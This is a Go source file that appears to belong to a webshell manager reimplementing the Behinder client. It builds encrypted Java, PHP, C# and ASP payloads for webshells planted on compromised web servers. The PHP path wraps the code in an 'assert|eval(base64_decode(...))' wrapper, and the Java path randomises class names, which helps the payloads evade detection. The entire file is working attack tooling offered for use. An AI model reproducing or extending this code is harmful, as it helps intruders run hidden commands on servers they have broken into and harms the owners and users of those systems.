package behinder

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/Go0p/wsm/lib/dynamic"
	"github.com/Go0p/wsm/lib/payloads"
	"github.com/Go0p/wsm/lib/shell"
	"regexp"
	"strconv"
	"strings"
)

func GetData(key []byte, className string, params map[string]string, types shell.ScriptType, encryptType int) string {
	var bincls []byte
	if types == shell.JavaScript {
		bincls = getParamedClass(className, params)
		//if (extraData != null) {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		encrypedBincls := encryptForJava(bincls, key)
		return base64.StdEncoding.EncodeToString(encrypedBincls)
	} else if types == shell.PhpScript {
		bincls = getParamedPhp(className, params)
		bincls = []byte(base64.StdEncoding.EncodeToString(bincls))
		//bincls = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
		bincls = []byte(("assert|eval(base64_decode('" + string(bincls) + "'));"))
		//if extraData != null {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		encrypedBincls := encryptForPhp(bincls, key, encryptType)
		fmt.Println(base64.StdEncoding.EncodeToString(encrypedBincls))
		fmt.Println(len(base64.StdEncoding.EncodeToString(encrypedBincls)))
		return base64.StdEncoding.EncodeToString(encrypedBincls)
	} else if types == shell.CsharpScript {
		bincls = GetParamedAssembly(className, params)
		//if (extraData != null) {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		encrypedBincls := encryptForCSharp(bincls, key)
		return string(encrypedBincls)
	} else if types == shell.AspScript {
		bincls = GetParamedAsp(className, params)
		//if (extraData != null) {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		//fmt.Println(hex.EncodeToString(encryptForAsp(bincls, key)))
		xx := encryptForAsp(bincls, key)
		fmt.Println("encode : ", hex.EncodeToString(xx))
		return string(xx)
	} else {
		return ""
	}
}

func getParamedClass(clsName string, params map[string]string) []byte {
	//filePath := fmt.Sprintf("E:\\Code\\shells\\bingo\\internal\\payloadx\\behinder\\java\\%s.class", clsName)
	//payloadBytes := getFileContent(filePath)
	//payloadBytes, err := payloadx.BeClassFiles.ReadFile(fmt.Sprintf("java/%s.class", clsName))
	payloadBytes, err := payloads.BeClassFiles.ReadFile(fmt.Sprintf("behinder/java/%s.class", clsName))
	if err != nil {
		panic(err)
	}
	for k, v := range params {
		payloadBytes, _ = dynamic.ReplaceClassStrVar(payloadBytes, k, v)
	}
	result := payloadBytes
	oldClassName := fmt.Sprintf("net/behinder/payload/java/%s", clsName)
	if clsName != "LoadNativeLibraryGo" {
		newClassName := dynamic.RandomClassName()
		fmt.Println("随机包名Class :", newClassName)
		result = dynamic.ReplaceClassName(result, oldClassName, newClassName)
	}
	// 修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行，不知道有没有 bug
	result[7] = 49
	return result
}

func keySet(m map[string]string) []string {
	// 数组默认长度为map长度,后面append时,不需要重新申请内存和拷贝,效率很高
	j := 0
	keys := make([]string, len(m))
	for k := range m {
		keys[j] = k
		j++
	}
	return keys
}

func getParamedPhp(clsName string, params map[string]string) []byte {
	var code strings.Builder
	//payloadPath := fmt.Sprintf("internal/payloadx/behinder/php/%s.php", clsName)
	//payloadx := getFileContent(payloadPath)
	payloadBytes, err := payloads.BePhpFiles.ReadFile(fmt.Sprintf("behinder/php/%s.php", clsName))
	if err != nil {
		panic(err)
	}
	code.WriteString(string(payloadBytes))
	paraList := ""
	paramsList := getPhpParams(payloadBytes)
	fmt.Println(paramsList)
	for _, paraName := range paramsList {
		fmt.Println("paraName----", paraName)
		if dynamic.InStrSlice(keySet(params), paraName) {
			paraValue := params[paraName]
			paraValue = base64.StdEncoding.EncodeToString([]byte(paraValue))
			code.WriteString(fmt.Sprintf("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName))
			paraList = paraList + ",$" + paraName
		} else {
			code.WriteString(fmt.Sprintf("$%s=\"%s\";", paraName, ""))
			paraList = paraList + ",$" + paraName
		}
	}

	paraList = strings.Replace(paraList, ",", "", 1)
	code.WriteString("\r\nmain(" + paraList + ");")
	return []byte(code.String())
}

// 获取 php 代码中需要更改的 params
func getPhpParams(phpPayload []byte) []string {
	paramList := make([]string, 0, 2)
	mainRegex := regexp.MustCompile(`main\s*\([^)]*\)`)
	mainMatch := mainRegex.Match(phpPayload)
	mainStr := mainRegex.FindStringSubmatch(string(phpPayload))

	if mainMatch && len(mainStr) > 0 {
		paramRegex := regexp.MustCompile(`\$([a-zA-Z]*)`)
		//paramMatch := paramRegex.FindStringSubmatch(mainStr[0])
		paramMatch := paramRegex.FindAllStringSubmatch(mainStr[0], -1)
		if len(paramMatch) > 0 {
			for _, v := range paramMatch {
				paramList = append(paramList, v[1])
			}
		}
	}

	return paramList
}

func GetParamedAssembly(clsName string, params map[string]string) []byte {
	//filePath := fmt.Sprintf("internal/payloadx/behinder/csharp/%s.dll", clsName)
	//payloadx := getFileContent(filePath)
	payloadBytes, err := payloads.BeDllFiles.ReadFile(fmt.Sprintf("behinder/csharp/%s.dll", clsName))
	if err != nil {
		panic(err)
	}
	if len(keySet(params)) == 0 {
		return payloadBytes
	} else {
		paramsStr := ""
		var paramName, paramValue string
		for key := range params {
			fmt.Println(key)
			paramName = key
			paramValue = base64.StdEncoding.EncodeToString([]byte(params[paramName]))
			paramsStr = paramsStr + paramName + ":" + paramValue + ","
		}
		paramsStr = paramsStr[0 : len(paramsStr)-1]
		token := "~~~~~~" + paramsStr
		return dynamic.MergeBytes(payloadBytes, []byte(token))
	}
}

func GetParamedAsp(clsName string, params map[string]string) []byte {
	var code strings.Builder
	//payloadPath := fmt.Sprintf("internal/payloadx/behinder/asp/%s.asp", clsName)
	//payloadx := getFileContent(payloadPath)
	payloadBytes, err := payloads.BeAspFiles.ReadFile(fmt.Sprintf("behinder/asp/%s.asp", clsName))
	if err != nil {
		panic(err)
	}
	code.WriteString(string(payloadBytes))
	paraList := ""
	if len(params) > 0 {
		paraList = paraList + "Array("
		for _, paramValue := range params {
			var paraValueEncoded string
			for _, v := range paramValue {
				//fmt.Println(v)
				paraValueEncoded = paraValueEncoded + "chrw(" + strconv.Itoa(int(v)) + ")&"
				//fmt.Println(paraValueEncoded)
			}
			paraValueEncoded = strings.TrimRight(paraValueEncoded, "&")
			paraList = paraList + "," + paraValueEncoded
		}
		paraList = paraList + ")"
	}
	paraList = strings.Replace(paraList, ",", "", 1)
	fmt.Println(paraList)
	code.WriteString("\r\nmain " + paraList + "")
	//fmt.Println(code.String())
	return []byte(code.String())
}
